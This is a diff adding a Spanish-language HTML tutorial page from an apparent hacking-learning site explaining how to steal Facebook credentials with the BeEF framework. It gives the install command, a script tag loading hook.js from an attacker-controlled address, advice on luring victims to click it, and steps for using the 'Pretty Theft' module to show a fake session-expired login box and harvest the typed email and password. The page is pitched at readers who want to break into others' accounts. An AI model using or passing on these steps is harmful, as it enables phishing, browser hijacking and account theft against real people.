@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-156451356-1"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+
+        gtag('config', 'UA-156451356-1');
+    </script>
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <link rel="icon" type="image/jpg" href="../Images/Erik172Logo.jpg" />
+
+    <meta name="author" content="Erik172">
+
+    <link rel="stylesheet" href="../style.css">
+    <link rel="stylesheet" href="../Images/style.css">
+
+    <title>Z0172CK</title>
+</head>
+<body>
+    <div id="particles-js"></div>
+
+    <header>
+        <div class="menu">
+            <div class="navbar navbar-expand-lg navbar-dark bg-black fixed-top p-2">
+                <nav>
+                    <div class="container">
+                        <a class="navbar-brand" href="index.html">
+                            <img src="../Images/Erik172Logo.jpg" alt="Erik172 Z0172CK Logo" width="30" height="30"> Z0172CK 
+                            <span class="text-muted">V0.0.8</span> 
+                        </a>
+                    </div>
+                </nav>
+            </div>
+        </div>
+
+        <div class="submenu">
+            <div class="subcontenedor">
+                <nav>
+                    <ul id="sublist">
+                        <li><a href="../index.html">Inicio</a></li>
+                        <li><a href="../Windows/windows.html">Windows</a></li>
+                        <li><a href="../Linux/linux.html">Linux</a></li>
+                        <li><a href="../hacking.html">Hacking</a></li>
+                    </ul>
+                </nav>
+            </div>
+        </div>
+
+    <div class="texto">
+        <h2>
+            Como obtener credenciales de Facebook sin hackear Facebook
+        </h2>
+        <br>
+        <p>Z0172CK</p>
+    </div>
+
+    <div class="principal contenedor">
+        <article>
+            <p>
+                Muchas personas vienen a Z0172CK buscando piratear Facebook sin las habilidades necesarias para hacerlo. Facebook esta lejos de ser inquebrantable, pero para hacerlo, necesitaras algunas habilidades , y el desarrollo de habilidades es de lo que se trata z0172ck.
+            </p>
+
+            <p>
+                A veces, si tiene un poco de habilidad, un poco de suerte y un poco de ingenieria social, 
+                puede obtener las credenciales de Facebook. 
+                De eso se trata este tutorial. 
+                Si no se toma el tiempo para <a href="instalandokali-linux">instalar Kali</a> y aprender un poco sobre las redes y Linux , 
+                esto no funcionara para usted, pero si esta dispuesto a tomarse un poco de tiempo para estudiar aqui en Z0172CK, probablemente pueda obtener acceso a las credenciales de alguien en Facebook muy facilmente con este pequeno truco.
+            </p>
+
+            <p>
+                (Todos los usuarios de Facebook deben tomar nota de esto si no quieres ser hackeado ).
+            </p>
+        </article>
+
+        <article>
+            <h2 class="titulo">Abra BeEF</h2>
+            <br>
+            <p>
+                Sino tiene istalado BeEF lo puede hacer con el Siguinte Comando:
+            </p>
+
+            <pre class="eckosc_syntax eckosc_syntax_theme_dark hljs nginx">
+                <code>
+                     sudo apt <span class="hljs-attribute">install </span> beef-xss
+                </code>
+            </pre>
+
+            <p>
+                Enciende Kali, y deberias ser recibido con una pantalla como la de abajo. Inicie BeEF haciendo clic en el icono de vaca a la izquierda del escritorio de Kali.
+            </p>
+
+            <img src="../Images/HackearFacebookSinHackearlo/Img1.png" alt="Img1">
+            <br><br><br>
+
+            <p>
+                Cuando haces clic en BeEF xss Framework , comienza BeEF abriendo un terminal.
+            </p>
+
+            <img src="https://img.wonderhowto.com/img/50/56/63596576139934/0/hack-like-pro-get-facebook-credentials-without-hacking-facebook.w1456.jpg" alt="hack-like-pro-get-facebook-credentials-without-hacking-facebook">
+            <br><br><br>
+
+            <p>
+                BeEF es una aplicacion que se ejecuta en segundo plano en un servidor web de su sistema al que accede desde un navegador. Una vez que BeEF este en funcionamiento, abra su navegador para acceder a su interfaz. Puede iniciar sesion en BeEF utilizando el nombre de usuario beef y la contrasena <strong>beef</strong> .
+            </p>
+
+            <img src="https://img.wonderhowto.com/img/61/74/63596320565861/0/hack-like-pro-get-facebook-credentials-without-hacking-facebook.w1456.jpg" alt="hack-like-pro-get-facebook-credentials-without-hacking-facebook">
+            <br><br><br>
+        </article>
+
+        <article>
+            <h2 class="titulo">Engancha el navegador de la victima</h2>
+            <br>
+
+            <p>
+                Esta es la parte mas critica, tal vez incluso la mas dificil, de este truco. Debe hacer que la victima haga clic en un enlace de JavaScript especialmente disenado para "enganchar" su navegador. Esto se puede hacer de innumerables maneras.
+            </p>
+
+            <p>
+                La forma mas simple es simplemente incrustar el codigo en su sitio web e incitar al usuario a hacer clic en el. Esto puede hacerse mediante el texto " Haga clic aqui para obtener mas informacion " o " Haga clic aqui para ver el video ". Use su imaginacion.
+            </p>
+
+            <p>
+                El guion se parece a lo siguiente. Incruste en una pagina web, y cuando alguien hace clic en ella, ¡es dueno de su navegador! (Comente a continuacion si tiene alguna pregunta sobre esto; tambien puede usar el MitMf para enviar el codigo al usuario, pero esto requiere mas habilidad).
+            </p>
+
+            <pre class="eckosc_syntax eckosc_syntax_theme_dark hljs nginx">
+                <code>
+                    <strong>&lt;script src= "http://192.168.1.101:3000/hook.js&amp;#8221 ; type= "text/javascript" &gt;&lt;/script&gt;</strong>
+                </code>
+            </pre>
+            
+            <p>A partir de aqui, supondre que ha "enganchado" el navegador de la victima y esta listo para poseerlo.</p>
+
+        </article>
+
+        <article>
+            <h2 class="titulo">Enviar un cuadro de dialogo al usuario</h2>
+            <br>
+
+            <p>
+                Cuando haya enganchado el navegador de la victima, su direccion IP, junto con el sistema operativo y los iconos de tipo de navegador, apareceran en el panel "Navegadores enganchados" a la izquierda. Aqui, simplemente he usado mi propio navegador para demostrar.
+            </p>
+
+            <p>
+                Si hacemos clic en el navegador conectado, se abre una interfaz BeEF en el lado derecho. Tenga en cuenta que nos da los detalles del navegador inicialmente. Tambien nos proporciona una serie de pestanas. Para nuestros propositos aqui, estamos interesados ​​en la pestana 'Comandos'.
+            </p>
+
+            <img src="https://img.wonderhowto.com/img/11/72/63596576825872/0/hack-like-pro-get-facebook-credentials-without-hacking-facebook.w1456.jpg" alt="hack-like-pro-get-facebook-credentials-without-hacking-facebook">
+            <br><br><br>
+
+            <p>
+                Haga clic en la pestana "Comandos", luego desplacese hacia abajo por el "Arbol de modulos" hasta llegar a "Ingenieria social" y haga clic para expandirlo. Mostrara numerosos modulos de ingenieria social. Haga clic en "Pretty Theft", que abrira una ventana de "Historial de resultados del modulo" y "Pretty Theft".
+            </p>
+
+            <p>
+                Este modulo le permite enviar una ventana emergente en el navegador del usuario. En nuestro caso, utilizaremos el cuadro de dialogo de Facebook.
+            </p>
+
+            <img src="https://img.wonderhowto.com/img/39/73/63596576942981/0/hack-like-pro-get-facebook-credentials-without-hacking-facebook.w1456.jpg" alt="hack-like-pro-get-facebook-credentials-without-hacking-facebook">
+            <br><br><br>
+
+            <p>
+                Si hacemos clic en el cuadro "Tipo de dialogo", podemos ver que este modulo no solo puede crear un cuadro de dialogo de Facebook, sino tambien un cuadro de dialogo de LinkedIn, Windows, YouTube, Yammer y generico. Seleccione el tipo de dialogo de Facebook, luego haga clic en el boton "Ejecutar" en la parte inferior.
+            </p>
+
+            <img src="https://img.wonderhowto.com/img/62/87/63596577067887/0/hack-like-pro-get-facebook-credentials-without-hacking-facebook.w1456.jpg" alt="hack-like-pro-get-facebook-credentials-without-hacking-facebook">
+            <br><br><br>
+
+        </article>
+
+        <article>
+            <h2 class="titulos">El cuadro de dialogo aparece en el sistema de destino</h2>
+            <br>
+
+            <p>
+                Cuando haces clic en "Ejecutar" en BeEF, aparecera un cuadro de dialogo en el navegador de la victima como el que se muestra a continuacion. Le dice a la victima que su sesion de Facebook ha expirado y que deben volver a ingresar sus credenciales.
+            </p>
+
+            <img src="https://img.wonderhowto.com/img/49/75/63596577172684/0/hack-like-pro-get-facebook-credentials-without-hacking-facebook.w1456.jpg" alt="hack-like-pro-get-facebook-credentials-without-hacking-facebook">
+            <br><br><br>
+
+            <p>
+                A pesar de que puede ser sospechoso de un tal cuadro emergente, la mayoria de usuarios confian en que su sesion de Facebook expiro y solo tiene que introducir su correo electronico y contrasena en.
+            </p>
+
+            <img src="https://img.wonderhowto.com/img/13/86/63596577213950/0/hack-like-pro-get-facebook-credentials-without-hacking-facebook.w1456.jpg" alt="hack-like-pro-get-facebook-credentials-without-hacking-facebook">
+            <br><br><br>
+
+        </article>
+
+        <article>
+            <h2 class="titulo">Coseche las credenciales</h2>
+            <br>
+
+            <p>
+                De vuelta en nuestro sistema en la interfaz BeEf, podemos ver que las credenciales aparecen en la ventana "Resultados del comando". La victima ingreso su direccion de correo electronico "loveofmylife@gmail.com" y su contrasena "sweetbippy" y fueron capturados y presentados a usted en BeEF.
+            </p>
+
+            <img src="https://img.wonderhowto.com/img/37/65/63596577301231/0/hack-like-pro-get-facebook-credentials-without-hacking-facebook.w1456.jpg" alt="hack-like-pro-get-facebook-credentials-without-hacking-facebook">
+            <br><br><br>
+
+            <p>
+                Si realmente esta decidido a obtener esas credenciales de Facebook, definitivamente se puede hacer, y esta es solo una forma de muchos metodos (pero probablemente el mas simple).
+            </p>
+
+            <p>
+                Si quieres desarrollar las habilidades a un nivel aun mas alto, comienza a estudiar aqui en Z0172CK para dominar el conjunto de habilidades mas valioso del siglo XXI: ¡piratear!
+            </p>
+        </article>
+    </div>
+
+    <footer class="footer-blog">
+        <div class="wrapper">
+            <h2 class="footer-blog-title"> 
+                <a href="https://z0172ck.me" itemprop="headline">
+                    <img src="../Images/Erik172Logo.jpg" alt="Erik172" width="150" height="150">
+                </a>
+            </h2>
+
+            <p class="footer-blog-description">Hacemos las cosas faciles. Aprende con nosotros y sientete apasionado por la tecnologia e informatica. Z0172CK</p>
+        </div> 
+    </footer>
+
+    <script src="https://code.jquery.com/jquery-latest.js"></script>
+    <script src="../particles.js" type="text/javascript"></script>
+    <script src="../app.js" type="text/javascript"></script>
+
+    <script>
+        $(document).ready(function(){
+ 
+        $('.ir-arriba').click(function(){
+            $('body, html').animate({
+                scrollTop: '0px'
+            }, 300);
+        });
+
+        $(window).scroll(function(){
+            if( $(this).scrollTop() > 0 ){
+                $('.ir-arriba').slideDown(300);
+            } else {
+               $('.ir-arriba').slideUp(300);
+            }
+        });
+
+       });
+    </script>
+</body>
+</html>
